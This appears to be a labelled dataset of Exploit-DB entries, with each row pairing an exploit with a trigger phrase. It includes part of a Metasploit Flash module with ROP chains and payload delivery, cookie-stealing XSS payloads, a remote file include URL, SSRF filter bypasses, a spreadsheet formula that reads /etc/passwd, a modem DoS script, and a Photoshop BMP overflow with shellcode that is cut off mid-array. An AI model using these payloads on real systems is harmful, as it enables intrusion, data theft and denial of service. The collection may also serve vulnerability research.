(-> ecx) 					0x10308b0e, # POP EDI # RETN (Flash32_11_3_300_268.ocx) 					0x10308b0f, # ROP NOP (-> edi) 					0x10663a00, # POP EDX # RETN (Flash32_11_3_300_268.ocx) 					0x00000040, # newProtect (0x40) (-> edx) 					0x1023e9b9, # POP EAX # RETN (Flash32_11_3_300_268.ocx) 					nop,        # NOPS (-> eax) 					0x1069120b, # PUSHAD # RETN (Flash32_11_3_300_268.ocx) 				].pack(""V*"")  			else  				print_status(""Default back to JRE ROP"") 				stack_pivot = [ 					0x7c34a028, # POP EDI # POP ESI # RETN (1e0d0000) 					0x0c0c0c0c, 					0x7c348b05, # xchg eax, esp # ret (1e0d0008) 				].pack(""V*"")  				rop = [ 					0x7c37653d, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN 					0x00001000, # (dwSize) 					0x7c347f98, # RETN (ROP NOP) 					0x7c3415a2, # JMP [EAX] 					0xffffffff, 					0x7c376402, # skip 4 bytes 					0x7c345255, # INC EBX # FPATAN # RETN 					0x7c352174, # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN 					0x7c344f87, # POP EDX # RETN 					0x00000040, # flNewProtect 					0x7c34d201, # POP ECX # RETN 					0x7c38b001, # &Writable location 					0x7c347f97, # POP EAX # RETN 					0x7c37a151, # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll] 					0x7c378c81, # PUSHAD # ADD AL,0EF # RETN 					0x7c345c30, # ptr to 'push esp #  ret ' 				].pack(""V*"")  			end 			p = stack_pivot 			p << rop 			p << payload.encoded 		end 		return p 	end  	def get_target(agent) 		#If the user is already specified by the user, we'll just use that 		return target if target.name != 'Automatic'  		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/ 			return targets[1]  #IE 6 on Windows XP SP3 		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/ 			return targets[2]  #IE 7 on Windows XP SP3 		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/ 			return targets[3]  #IE 8 on Windows XP SP3 		else 			return nil 		end 	end  	def on_request_uri(cli, request)  		agent = request.headers['User-Agent'] 		print_status(""User-agent: #{agent}"") 		my_target = get_target(agent)  		print_status(""Client requesting: #{request.uri}"")  		# Avoid the attack if the victim doesn't have the same setup we're targeting 		if my_target.nil? 			print_error(""Browser not supported: #{agent}"") 			send_not_found(cli) 			return 		end  		# The SWF request itself 		if request.uri =~ /\.swf$/ 			print_status(""Sending SWF"") 			send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash'}) 			return 		end  		# The TXT payload request 		if request.uri =~ /\.txt$/ 			flash_version = request.headers['x-flash-version'] 			shellcode = get_payload(my_target, flash_version).unpack('H*')[0] 			print_status(""Sending Payload"") 			send_response(cli, shellcode, { 'Content-Type' => 'text/plain' }) 			return 		end  		swf_uri = get_resource() + Rex::Text.rand_text_alphanumeric(rand(8)+4) + "".swf""  		html = %Q| 		<html> 		<head> 		</head> 		<body> 		<object width=""1"" height=""1"" type=""application/x-shockwave-flash"" data=""#{swf_uri}""> 		<param name=""movie"" value=""#{swf_uri}""> 		</object> 		</body> 		</html> 		|  		html = html.gsub(/^\t\t/, '')  		# we need to handle direct /pay.txt requests 		proc = Proc.new do |cli, req| 			on_request_uri(cli, req) 		end 		add_resource({'Path' => ""/pay.txt"", 'Proc' => proc}) rescue nil  		print_status(""Sending HTML"") 		send_response(cli, html, {'Content-Type'=>'text/html'}) 	end  	def exploit 		@swf = create_swf 		print_status(""SWF Loaded: #{@swf.length.to_s} bytes"") 		super 	end  	def create_swf 		path = ::File.join( Msf::Config.install_root, ""data"", ""exploits"", ""CVE-2012-1535"", ""trigger.swf"" ) 		fd = ::File.open( path, ""rb"" ) 		swf = fd.read(fd.stat.size) 		fd.close 		return swf 	end  	def cleanup 		vprint_status(""Removing txt resource"") 		remove_resource('/pay.txt') rescue nil 		super 	end  end",a specially crafted URL,1
39398,"WPS Office < 2016 - '.xls' Heap Memory Corruption #####################################################################################  Application: WPS Office  Platforms: Windows  Versions: Version 2016  Author: Francis Provencher of COSIG  Twitter: @COSIG_  #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) POC  #####################################################################################  =============== 1) Introduction ===============  WPS Office (an acronym for Writer, Presentation and Spreadsheets,[2] previously known as Kingsoft Office) is an office  suite for Microsoft Windows, Linux,[1] iOS[3] and Android OS,[4] developed by Zhuhai-basedChinese software developer Kingsoft.  WPS Office is a suite of software which is made up of three primary components: WPS Writer, WPS Presentation, and WPS Spreadsheet.  The personal basic version is free to use, but a watermark is printed on all printed output after the 30 day trial ends.  (https://en.wikipedia.org/wiki/WPS_Office)  #####################################################################################  ============================ 2) Report Timeline ============================  2015-12-31: Francis Provencher from COSIG report the issue to WPS; 2016-01-04: WPS security confirm this issue; 2016-01-14: COSIG ask an update status; 2016-01-21: COSIG ask an update status; 2016-02-01: COSIG release this advisory;  #####################################################################################  ============================ 3) Technical details ============================  This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of WPS. User interaction is required to exploit this vulnerability in that the target must open a malicious file. By providing a malformed .xls file, an attacker can cause an heap memory corruption. An attacker could leverage this to execute arbitrary code under the context of the WPS Spreadsheet process.  #####################################################################################  ===========  4) POC  ===========  http://protekresearchlab.com/exploits/COSIG-2016-07.xlsx https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39398.zip  ###############################################################################",providing a malformed .xls file,1
25376,ModernGigabyte ModernBill 4.3 - 'news.php' File Inclusion source: https://www.securityfocus.com/bid/13086/info  ModernBill is prone to a remote file include vulnerability.  The problem presents itself specifically when an attacker passes the location of a remote attacker-specified script through the 'news.php' script.  ModernBill 4.3 and prior versions are vulnerable to this issue.   http://www.example.com/samples/news.php?DIR=http://www.example.com/,passes the location of a remote attacker-specified script through the 'news.php' script,1
24037,"PostNuke Phoenix 0.726 - 'openwindow.php?hlpfile' Cross-Site Scripting source: https://www.securityfocus.com/bid/10191/info  Multiple vulnerabilities were reported to exist in PostNuke Phoenix. The following specific vulnerabilities were reported:   - Multiple path disclosure vulnerabilities that occur when a user directly requests scripts in the ""/includes/blocks/"" and ""pnadodb"" directories. This issue also affects scripts that are associated in multiple modules.  - Multiple cross-site scripting vulnerabilities were reported in the Downloads and Web_Links modules as well as the openwindow.php script. These issues may permit remote attackers to cause hostile HTML and script code to be interpreted by a victim user's browser.  http://www.example.com/postnuke0726/javascript/openwindow.php?hlpfile=x<html><body>[xss code here] http://www.example.com/postnuke0726/javascript/openwindow.php?hlpfile=x<html><body%20onload=alert(document.cookie);>","scripts in the ""includesblocks"" and ""pnadodb"" directories",1
44881,"OX App Suite 7.8.4 - Multiple Vulnerabilities Product: OX App Suite Vendor: OX Software GmbH   Internal reference: 55872 (Bug ID) Vulnerability type: Cross-Site Scripting (CWE-80) Vulnerable version: 7.8.4 and earlier Vulnerable component: frontend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev30, 7.8.2-rev30, 7.8.3-rev36, 7.8.4-rev18 Vendor notification: 2017-10-18 Solution date: 2018-02-08 Public disclosure: 2018-06-08 CVE reference: CVE-2018-5754 CVSS: n/a  Vulnerability Details: Internet Explorer does not properly support modern Content Security Policies (""CSP""), which act as a failsafe for certain XSS attacks. Since the ""Open in Browser"" feature is a potential attack vector to inject malicious content, we removed that option at the user interface. Instead, users shall download attachments and open them from their device. This removes the issue of executing script-code under the same domain.  Risk: Malicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).  Steps to reproduce: 1. This is a precautionary change  Solution: We no longer offer ""Open in Browser"" for IE based browsers. Microsoft Edge is not affected by this change.  ---  Internal reference: 56333 (Bug ID) Vulnerability type: Improper Privilege Management (CWE-269) Vulnerable version: 7.8.4 and earlier Vulnerable component: backend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22 Vendor notification: 2017-11-30 Solution date: 2018-02-08 Public disclosure: 2018-06-08 Researcher Credits: Michael Reizelman CVE reference: CVE-2018-5756 CVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)  Vulnerability Details: Permission checks for tasks were incomplete with regards to folder-to-object association.  Risk: Users within the same context could delete other users tasks.  Steps to reproduce: 1. Create a task as User A (ID: 1) 2. As User B, trigger a /api/tasks?action=delete call with task ID 1 but a valid task folder ID of User B  Solution: We enhanced permission checks for tasks for the ""delete"" call and check for folder-to-object association.  ---  Internal reference: 56359 (Bug ID) Vulnerability type: Improper Privilege Management (CWE-269) Vulnerable version: 7.8.4 and earlier Vulnerable component: backend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22 Vendor notification: 2017-12-01 Solution date: 2018-02-08 Public disclosure: 2018-06-08 Researcher Credits: Michael Reizelman CVE reference: CVE-2018-5756 CVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)  Vulnerability Details: Permission checks for appointments were incomplete with regards to folder-to-object association.  Risk: Users within the same context were able to add external participants to other users appointments. Those users would potentially get notified about subsequent appointment changes and could therefor gather information beyond their permission level.  Steps to reproduce: 1. Create a appointment as User A (ID: 1) 2. As User B, trigger a /api/calendar?action=confirm call with appointment ID 1 but a valid appointment folder ID of User B 3. Include a external participant in this ""confirm"" call  {""confirmmessage"":"""",""confirmation"":1, ""type"":5, ""mail"":""test@example.com""}  Solution: We enhanced permission checks for appointments for the ""confirm"" call and check for folder-to-object association.  ---  Internal reference: 56334 (Bug ID) Vulnerability type: Server-Side Request Forgery (CWE-918) Vulnerable version: 7.8.4 and earlier Vulnerable component: backend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22 Vendor notification: 2017-11-30 Solution date: 2018-02-08 Public disclosure: 2018-06-08 Researcher Credits: Alan Watt CVE reference: CVE-2018-5752 CVSS: 6.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L)  Vulnerability Details: OX App Suite tries to look up external mail account configuration using XML files for auto-configuration, that are placed at most mail providers hosts. Redirects of external HTTP services could be used to access local or internal networks instead, when looking up that external account information.  Risk: By validating error codes and request duration, attackers can get insight about internal network configuration, open ports and associated services. Such information can serve as reconnaissance for further attacks.  Steps to reproduce: 1. Provide a malicious HTTP service that redirects any incoming request to a local IP/Port combination using HTTP 301. 2. Attempt to add a external mail account that uses the same domain as the malicious HTTP service 3. Check error codes and response times of the /api/autoconfig?action=get request  Solution: We now deny access to network internal endpoints when following HTTP redirects.  ---  Internal reference: 56407 (Bug ID) Vulnerability type: Content Spoofing (CWE-451) Vulnerable version: 7.8.4 and earlier Vulnerable component: frontend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev31, 7.8.2-rev31, 7.8.3-rev41, 7.8.4-rev20 Vendor notification: 2017-12-06 Solution date: 2018-02-08 Public disclosure: 2018-06-08 CVE reference: CVE-2018-5753 CVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)  Vulnerability Details: The origin of a E-Mail is determined by the ""From"" or ""Sender"" address, which are provided by Mail headers and usually consist of a arbitrary personal part ""Mr. Foo Bar (CEO)"" and the actual sender address ""<foo@example.com>"". Using specific unicode characters at the personal part could be used to disguise the actual origin of the E-Mail.  Risk: Attackers can use this vulnerability to support social-engineering based attacks to individual users by tampering the origin of an E-Mail.  Steps to reproduce: 1. Create a E-Mail which contains very long ""personal"" parts or mail addresses as personal parts.  Solution: We now display the actual sender address next to the ""personal"" part of the sender and make sure that this information cannot be influenced by externally provided content.  ---  Internal reference: 56056 (Bug ID) Vulnerability type: Improper Privilege Management (CWE-269) Vulnerable version: 7.8.4 and earlier Vulnerable component: backend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev35, 7.8.2-rev38, 7.8.3-rev41, 7.8.4-rev19 Vendor notification: 2017-11-08 Solution date: 2017-12-13 Public disclosure: 2018-06-08 Researcher Credits: Alan Watt CVE reference: CVE-2017-17062 CVSS: 3.1 (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N)  Vulnerability Details: Certain ""user attributes"" (UA identifier, login timestamps...) can be saved by using arbitrary users identifiers within the same context. The original intention was to allow this for users with elevated permissions.  Risk: While no way to access other users attributes is known, this can be used to void non-repudiation.  Steps to reproduce: 1. Forge a API request to store/request custom user attributes for a different user (ID: 3)  Proof of concept: PUT https://example.com/ajax/user?session=xxx&name=tree&id=3&action=setAttribute {""name"":""foo"", ""value"": ""bar""}  Solution: We check permissions on a user- and context-level to make sure just privileged users can set and read user attributes.  ---  Internal reference: 56580 (Bug ID) Vulnerability type: Cross-Site Scripting (CWE-80) Vulnerable version: 7.8.4 and earlier Vulnerable component: office-web Report confidence: Confirmed Solution status: Confirmed Solution status: Fixed by Vendor Fixed version: 7.8.3-rev12, 7.8.4-rev9 Vendor notification: 2017-12-22 Solution date: 2018-02-08 Public disclosure: 2018-06-08 CVE reference: CVE-2018-5754 CVSS: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)  Vulnerability Details: Script code within Presentations is being executed when transferring it to the clipboard. This is done by ""copying"" or ""cutting"" text using keyboard commands.  Risk: Malicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).  Steps to reproduce: 1. Create a malicious presentation file which contains script-code as text 2. Cloak the code by using low-contrast colors, font sizes etc.  Proof of concept: ""><img src=x onerror=prompt(document.domain)>  Solution: We make sure that client-side content gets cleaned up and not evaluated before transferring to the clipboard.  ---  Internal reference: 56582 (Bug ID) Vulnerability type: Cross-Site Scripting (CWE-80) Vulnerable version: 7.8.4 and earlier Vulnerable component: backend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22 Vendor notification: 2017-12-22 Solution date: 2018-02-08 Public disclosure: 2018-06-08 Researcher Credits: Secator CVE reference: CVE-2018-5754 CVSS: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)  Vulnerability Details: Malformed CSS can be used to inject script code.  Risk: Malicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).  Steps to reproduce: 1. Create a malicious E-Mail and send it to a OX App Suite user 2. Open that E-Mail as user  Proof of concept: <style> .a {         font-family: </styl/**/e>;         font-family: </sty/**/le>;         font-family: </s/*data*/tyle>; } .<iframe/onload=alert(document[""cookie""])> { } </style>  Solution: We enhanced the sanitizer to consider malformed CSS content and improve stability.  ---  Internal reference: 56619 (Bug ID) Vulnerability type: Server-Side Request Forgery (CWE-918) Vulnerable version: 7.8.4 and earlier Vulnerable component: backend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22 Vendor notification: 2018-01-03 Solution date: 2018-02-08 Public disclosure: 2018-06-08 Researcher Credits: Alan Watt CVE reference: CVE-2018-5752 CVSS: 6.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L)  Vulnerability Details: OX App Suite can be used to embed external RSS feeds, which are requested using HTTP. Redirects of external HTTP services could be used to access local or internal networks instead, when looking up that external account information.  Risk: By validating error codes and request duration, attackers can get insight about internal network configuration, open ports and associated services. Such information can serve as reconnaissance for further attacks.  Steps to reproduce: 1. Provide a malicious HTTP service that redirects any incoming HTTP request to a local IP/Port combination using HTTP 301. 2. Add a RSS feed that points to the same host as the malicious HTTP service  Solution: We now deny access to network internal endpoints when following HTTP redirects.  ---  Internal reference: 56477 (Bug ID) Vulnerability type: Information Exposure (CWE-200) Vulnerable version: 7.8.4 and earlier Vulnerable component: backend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22 Vendor notification: 2017-12-12 Solution date: 2018-02-08 Public disclosure: 2018-06-08 CVE reference: CVE-2018-5751 CVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)  Vulnerability Details: Inviting external users to share content creates temporary user accounts to handle permissions. Several APIs expose information about user accounts, however data of external guests is not meant to be available for others than the sharee and users that got access to the shared content.  Risk: Information about guest users, primarily E-Mail addresses, is available to all users within the same context even though they are not entitled to access it.  Steps to reproduce: 1. Share content with an external user by using the ""invite by mail"" option 2. As another user of the same context, query the ""groups"" and ""users"" API   Solution: We restrict access to guest user data and reduce the amount of data provided for groups.  ---  Internal reference: 56706 (Bug ID) Vulnerability type: Server-Side Request Forgery (CWE-918) Vulnerable version: 7.8.4 and earlier Vulnerable component: backend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22 Vendor notification: 2017-10-16 Solution date: 2018-02-08 Public disclosure: 2018-06-08 Researcher Credits: Alan Watt CVE reference: CVE-2018-5752 CVSS: 6.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L)  Vulnerability Details: OX App Suite uses several blacklists to restrict access of external services. Those do not cover non-decimal representations of IP addresses and special IPv6 related addresses. Some libraries accept such values but our blacklist fails to convert them when checking.  Risk: Attackers can forge server-side requests to internal systems to gather information about network infrastructure and services.  Proof of concept: 1. Convert the IP address of a internal host, which is protected by a blacklist, to a octal or hexadecimal value 127.0.0.1: 0177.00.00.01 (8-bit octal) or 0x7f00000 (32-bit hexadecimal)  2. Use IPv6 mapping of IPv4 addresses 127.0.0.1: 0:0:0:0:0:FFFF:7F00:0001  3. Use very special representations of ""local"" addresses 127.0.0.1: 0000  4. Use IPv6 local addresses 127.0.0.1: :: or ::1  Solution: We did adjust our blacklist implementation to cover IPv6 and other representations of restricted addresses.  ---  Internal reference: 56718 (Bug ID) Vulnerability type: Path Traversal (CWE-22) Vulnerable version: 7.8.4 and earlier Vulnerable component: readerengine Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev3, 7.8.2-rev4, 7.8.3-rev5, 7.8.4-rev4 Vendor notification: 2018-01-10 Solution date: 2018-02-08 Public disclosure: 2018-06-08 Researcher Credits: Zhang Tianqi(pnig0s) CVE reference: CVE-2018-5755 CVSS: 7.7 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)  Vulnerability Details: Specifically crafted spreadsheets can be exploited to extract system information, including content and location of local files.  Risk: Attackers can read local files of the host running the ""readerengine"" component depending on their local access permissions for the ""open-xchange"" user. This includes configuration files which potentially include passwords and other sensitive information. Some functions allow to access internal system information like operating system and paths. Other than that its possible to check the existence of certain files that provide hints about patch level and other details.  Steps to reproduce: 1. Create a malicious ODS based spreadsheet and use formulas that reference local files or read system information  Proof of concept: =WEBSERVICE(""file:///etc/passwd"") =CELL(""filename"") =INFO(""system"")  Solution: We now filter ODS and OOXML function content against a blacklist.  ---  Internal reference: 56740 (Bug ID) Vulnerability type: Cross-Site Scripting (CWE-80) Vulnerable version: 7.8.4 and earlier Vulnerable component: backend Report confidence: Confirmed Solution status: Fixed by Vendor Fixed version: 7.6.3-rev3, 7.8.2-rev4, 7.8.3-rev5, 7.8.4-rev4 Vendor notification: 2018-01-12 Solution date: 2018-04-24 Public disclosure: 2018-06-08 Researcher Credits: Secator CVE reference: CVE-2018-5754 CVSS: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)  Vulnerability Details: Media-types can be altered in a way that our content scanner is circumvented and potentially harmful content gets passed to the requesting client.  Risk: Malicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).  Steps to reproduce: 1. Create a malicious XML file and modify its media-type 2. Upload, embed and make someone open this file  Proof of concept: ""t,text/html"" or ""t/@,image/svg+xml"" ""garbage\u00ff/garbage"" (will work for Firefox as it ""guesses"" the media-type based on the filename and multipart data)  Solution: We now reject to define media-types which are not covered by application logic.",Specifically crafted spreadsheets,1
11597,"RCA DCM425 Cable Modem - 'micro_httpd' Denial of Service (PoC) #!/usr/bin/python # Title: RCA DCM425 Cable Modem micro_httpd DoS/PoC # Date: 02/27/10 # Author: ad0nis  ad0nis@hackermail.com # Info: This script causes a Denial of Service on a DCM425 cable modem. # Sending 1040 bytes causes a reboot of the device after a few seconds # of it freezing up. I believe this may lead to remote code execution # but I did not bother to test it further.  # By default, this cable modem has an IP address of 192.168.100.1  # There are two different but similar models of this router, the only # difference I see between them is that one has an On/Off button on the # front. The one I discovered this on is the one without a button. I # have not tested this on the other model.  # Thanks to ShadowHatesYou for the inspiration to look closer at the # little black box on my network.  import sys, socket target = sys.argv[1] buffer = ( ""\x41"" * 1040 ) print ""Sending 1040 A's to"" ,target, ""on port 80\n"" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,80)) s.send(buffer) s.close()",Sending 1040 bytes,1
31979,"GNOME Evolution 2.22.2 - 'html_engine_get_view_width()' Denial of Service source: https://www.securityfocus.com/bid/29961/info  GNOME Evolution is prone to a denial-of-service vulnerability when handling email messages that contain specially crafted HTML.  Successful attacks will crash the application.  Evolution 2.22.2 is vulnerable; other versions may also be affected.   <IFRAME SRC=""A""></IFRAME> <FRAMESET><FRAME SRC=""A""></FRAMESET>",specially crafted HTML,1
3793,"Adobe Photoshop CS2 / CS3 - '.bmp' Local Buffer Overflow /****************************************************************************\ *                                                                            * *      Adobe Photoshop CS2 / CS3 Unspecified .BMP File Buffer Overflow       * *                                                                            * *                                                                            * * There is a buffer overflow in Adobe products that can be triggered while   * * processing a malformed BMP, DIB or RLE file.                               * *                                                                            * * This sploit runs calc.exe.                                                 * * Tested against Win XP SP2 FR.                                              * * Have Fun!                                                                  * *                                                                            * * Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>                 * \****************************************************************************/  #include ""stdio.h"" #include ""stdlib.h""  /* win32_exec -  EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com */ unsigned char Shellcode[] = ""\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x26"" ""\x45\x32\xe3\x83\xeb\xfc\xe2\xf4\xda\xad\x76\xe3\x26\x45\xb9\xa6"" ""\x1a\xce\x4e\xe6\x5e\x44\xdd\x68\x69\x5d\xb9\xbc\x06\x44\xd9\xaa"" ""\xad\x71\xb9\xe2\xc8\x74\xf2\x7a\x8a\xc1\xf2\x97\x21\x84\xf8\xee"" ""\x27\x87\xd9\x17\x1d\x11\x16\xe7\x53\xa0\xb9\xbc\x02\x44\xd9\x85"" ""\xad\x49\x79\x68\x79\x59\x33\x08\xad\x59\xb9\xe2\xcd\xcc\x6e\xc7"" ""\x22\x86\x03\x23\x42\xce\x72\xd3\xa3\x85\x4a\xef\xad\x05\x3e\x68"" ""\x56\x59\x9f\x68\x4e\x4d\xd9\xea\xad\xc5\x82\xe3\x26\x45\xb9\x8b"" ""\x1a\x1a\x03\x15\x46\x13\xbb\x1b\xa5\x85\x49\xb3\x4e\x3b\xea\x01"" ""\x55\x2d\xaa\x1d\xac\x4b\x65\x1c\xc1\x26\x53\x8f\x45\x6b\x57\x9b"" ""\x43\x45\x32\xe3"";   char bmp_file_part1[] =  ""\x42\x4d\x38\x70\x03\x00\x00\x00\x00\x00\x36\x04\x00\x00\x28\x00"" ""\x00\x00\xfd\x01\x00\x00\xb6\x01\x00\x00\x01\x00\x08\x00\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" ""\x41\x41\x41\x41\x41\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x45\x09\x92\x00\x4e\x09"" ""\x92\x00\x88\x23\x12\x00\x24\x00\x02\x00\x74\x21\x12\x00\x02\x00"" ""\x00\x00\x90\x41\x92\x00\x00\x90\xfd\x00\x05\x10\x91\x00\x1c\x20"" ""\x12\x00\x00\x00\x00\x00\xec\x20\x12\x00\x18\xee\x91\x00\x70\x09"" ""\x92\x00\xc0\xe4\x98\x00\x6f\x3e\x92\x00\x62\x3e\x92\x00\x08\x02"" ""\x00\x00\x2c\x24\x12\x00\x04\x24\x12\x00\x45\x09\x92\x00\x4e\x09"" ""\x92\x00\xd8\x23\x12\x00\x24\x00\x02\x00\xc4\x21\x12\x00\x02\x00"" ""\x00\x00\x90\x41\x92\x00\x00\x90\xfd\x00\x05\x10\x91\x00\x6c\x20"" ""\x12\x00\x00\x00\x00\x00\x3c\x21\x12\x00\x18\xee\x91\x00\x70\x09"" ""\x92\x00\xc0\xe4\x98\x00\x6f\x3e\x92\x00\x62\x3e\x92\x00\x08\x02"" ""\x00\x00\x7c\x24\x12\x00\x54\x24\x12\x00\xe8\x20\x12\x00\x00\x00"" ""\xaf\x00\x32\x07\x92\x00\x51\x00\x00\x00\xb8\x15\xaf\x00\x00\x00"" ""\xaf\x00\x50\xa0\x3f\x00\xc0\x20\x12\x00\x18\x00\x00\x00\x04\x23"" ""\x12\x00\x18\xee\x91\x00\x38\x07\x92\x00\xff\xff\xff\x00\x32\x07"" ""\x92\x00\xab\x06\x92\x00\xeb\x06\x92\x00\xc8\x23\x12\x00\x80\x02"" ""\x00\x00\x00\x00\x00\x00\xab\x06\x92\x00\xeb\x06\x92\x00\x08\x90"" ""\x58\x00\xb4\x00\x00\x00\x38\x04\x00\x00\x00\x00\x00\x00\x00\x05"" ""\x00\x00\xc6\x21\x00\x00\x00\x00\x00\x00\x64\xfc\xfd\x00\x45\x09"" ""\x92\x00\x4e\x09\x92\x00\x68\x65\x00\x00\xa8\x20\x12\x00\x54\x24"" ""\x12\x00\xe8\x23\x12\x00\x18\xee\x91\x00\x7c\x24\x12\x00\x08\x00"" ""\x00\x00\xf8\x23\x12\x00\x2e\x40\x92\x00\xa8\x20\x15\x00\xd0\x21"" ""\x12\x00\x70\x09\x92\x00\xc0\xe4\x98\x00\xef\x40\x92\x00\xbb\x40"" ""\x92\x00\x00\x00\x00\x00\x00\xfc\xfd\x00\x01\x80\x00\x00\xd0\x00"" ""\x57\x00\x36\x00\x00\x00\x70\x21\x12\x00\x5c\x00\x44\x00\x00\x00"" ""\x00\x00\x08\x00\x0a\x00\x88\x3e\x92\x00\x1a\x02\x00\x00\x00\x00"" ""\x00\x00\xab\x06\x92\x00\x00\x00\xe2\x00\x7c\x24\x12\x00\x64\x00"" ""\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x5a\x00\x6f\x00\x64\x00"" ""\x66\x00\x00\xfc\xfd\x00\xd0\x21\x12\x00\x02\x00\x00\x00\xa0\x20"" ""\x15\x00\x7a\x00\x00\x00\x08\x90\x58\x00\x5c\x00\x44\x00\x6f\x00"" ""\x63\x00\x75\x00\x6d\x00\x65\x00\x6e\x00\x74\x00\x73\x00\x20\x00"" ""\x61\x00\x6e\x00\x64\x00\x20\x00\x53\x00\x65\x00\x74\x00\x74\x00"" ""\x69\x00\x6e\x00\x67\x00\x10\x00\x00\x00\x38\x22\x12\x00\x00\x00"" ""\xaf\x00\x32\x07\x92\x00\x03\x00\x00\x00\x18\x07\xaf\x00\x00\x00"" ""\xaf\x00\x50\xa6\x45\x00\x10\x22\x12\x00\x5c\x00\x64\x00\x54\x24"" ""\x12\x00\x18\xee\x91\x00\x38\x07\x92\x00\xff\xff\xff\x00\x32\x07"" ""\x92\x00\xab\x06\x92\x00\xeb\x06\x92\x00\x20\x86\x96\x00\x0c\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x00\x64\x22\x12\x00\x00\x00"" ""\x00\x00\xc8\x05\x92\x00\xc8\x7b\x49\x00\x30\x23\x12\x00\x51\x05"" 